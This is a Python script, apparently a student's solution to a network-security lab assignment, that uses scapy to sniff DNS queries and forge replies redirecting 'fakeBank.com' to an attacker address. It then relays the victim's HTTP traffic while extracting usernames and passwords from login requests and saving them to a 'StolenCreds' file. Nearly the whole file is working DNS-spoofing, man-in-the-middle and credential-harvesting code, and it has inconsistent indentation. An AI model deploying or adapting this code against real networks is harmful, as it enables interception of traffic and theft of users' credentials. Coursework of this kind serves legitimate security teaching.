import os
import argparse
import socket
from scapy.all import *

conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "fakeBank.com"

def resolveHostname(hostname):
	# IP address of HOSTNAME. Used to forward tcp connection. 
	# Normally obtained via DNS lookup.
	return "127.1.1.1"

def log_credentials(username, password):
	# Write stolen credentials out to file
	# Do not change this
	with open("lib/StolenCreds.txt","wb") as fd:
		fd.write("Stolen credentials: username="+username+" password="+password)

def check_credentials(client_data):
	# TODO: Take a block of client data and search for username/password credentials
	# If found, log the credentials to the system by calling log_credentials().
	if client_data.__contains__('username') and client_data.__contains__('password'):
		Credi = client_data.split("\n")[4]
		Credi = Credi.split('&')
		username = Credi[0].split('=')[1]
		password = Credi[1].split('=')[1]
		log_credentials(username,password)
		print("\033[1;32;40m ===MOHAMED159588=== \033[m")
		print("\033[1;31;40m Username and Password Captured Successfuly ^_^\033[m")
		print("\033[1;31;40m You can Check attacker lib file for the Stolen creds \033[m")
		print("\033[1;31;40m"+"Username:"+username+"\033[m")
		print("\033[1;31;40m"+"Password:"+password+"\033[m")
		return
	else:
		print("Will re-check the next packet ^_^")
		return
	raise NotImplementedError

def handle_tcp_forwarding(client_socket, client_ip, hostname):
	# TODO: Continuously intercept new connections from the client
	# and initiate a connection with the host in order to forward data
	client_socket.listen(1)
	while True:
		# TODO: accept a new connection from the client on client_socket and
		# create a new socket to connect to the actual host associated with hostname
		
		conn, addr = client_socket.accept()
		RealHTTPServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		RealHTTPServerSocket.connect(('127.1.1.1',8000))
		# TODO: read data from client socket, check for credentials, and forward along to
		# host socket. Check for POST to '/post_logout' and exit after that request has completed.
		dataFromClient = conn.recv(8000)
		print("Checking for username and password on the current packet....")
		check_credentials(dataFromClient)

		print("\033[1;32;40m ===MOHAMED159588=== \033[m")

		RealHTTPServerSocket.send(dataFromClient)
		
		dataFromRealServer = RealHTTPServerSocket.recv(8000)
		#print(dataFromRealServer)
		conn.send(dataFromRealServer)
		RealHTTPServerSocket.close()
		if(dataFromClient.__contains__('/post_logout')):
			client_socket.close()
			print("Sockets Closed sucessfully. \033[1;32;40m ===Mohamed159588=== \033[m")
			exit()
		
	raise NotImplementedError

def dns_callback(pkt,extra_args):
	# TODO: Write callback function for handling DNS packets.
	print("\033[1;32;40m ===MOHAMED159588=== \033[m")
	if pkt.haslayer(DNSQR):
		print("Creating packet to be spoofed....")
        	spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
        	UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
		DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
		an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=100, rdata='127.0.0.3'))
		print("Spoofed packet sending...")
		send(spoofed_pkt)
	handle_tcp_forwarding(extra_args[1],extra_args[0],'127.0.0.1')
	raise NotImplementedError

def sniff_and_spoof(source_ip):
	# TODO: Open a socket and bind it to the attacker's IP and WEB_PORT
	print("\033[1;32;40m ===MOHAMED159588=== \033[m")
	AttackerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	AttackerSocket.bind((source_ip,WEB_PORT))
	AttackerSocket.listen(1)
	# This socket will be used to accept connections from victimized clients
	# TODO: sniff for DNS packets on the network. Make sure to pass source_ip
	print("Packet Sniffing ......")
	cb = lambda PacketSniffed, args=(source_ip, AttackerSocket):dns_callback(PacketSniffed, args);
    	Packets = sniff(prn=cb,store=0)
	
	print("Done...")
	# and the socket you created as extra callback arguments. 
	raise NotImplementedError

def main():
	parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
	parser.add_argument('--source_ip',nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')

	args = parser.parse_args()
	sniff_and_spoof(args.source_ip)

if __name__=="__main__":
	# Change working directory to script's dir
	# Do not change this
	abspath = os.path.abspath(__file__)
	dname = os.path.dirname(abspath)
	os.chdir(dname)
	main()
